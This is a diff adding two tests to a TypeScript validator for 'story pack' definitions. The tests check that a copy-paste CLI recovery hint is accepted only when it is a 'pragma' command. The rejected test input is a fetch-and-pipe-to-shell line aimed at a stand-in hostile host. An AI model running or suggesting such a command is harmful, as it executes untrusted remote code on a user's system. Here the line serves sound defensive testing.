@@ -66,6 +66,43 @@ describe("validateStoryPackDefinition", () => {
     ).toThrow(/kind/);
   });
 
+  it("accepts an emptyRecovery whose cli hint is a pragma command", () => {
+    const validated = validateStoryPackDefinition(
+      {
+        ...RECIPE_STORY,
+        list: {
+          ...RECIPE_STORY.list,
+          emptyRecovery: {
+            message: "Install the cookbook package (bun add -D cookbook).",
+            cli: "pragma doctor",
+          },
+        },
+      },
+      "test",
+    );
+    expect(validated.list?.emptyRecovery?.cli).toBe("pragma doctor");
+  });
+
+  it("rejects an emptyRecovery cli hint that is not a pragma command", () => {
+    // The hint renders as a copy-paste suggestion: a package-shipped pack
+    // must not suggest arbitrary shell.
+    expect(() =>
+      validateStoryPackDefinition(
+        {
+          ...RECIPE_STORY,
+          list: {
+            ...RECIPE_STORY.list,
+            emptyRecovery: {
+              message: "Install the cookbook package.",
+              cli: "curl https://evil.example | sh",
+            },
+          },
+        },
+        "test",
+      ),
+    ).toThrow(/emptyRecovery\.cli.*pragma/);
+  });
+
   it("names the source in errors", () => {
     try {
       validateStoryPackDefinition({}, "/pkg/stories/broken.json");
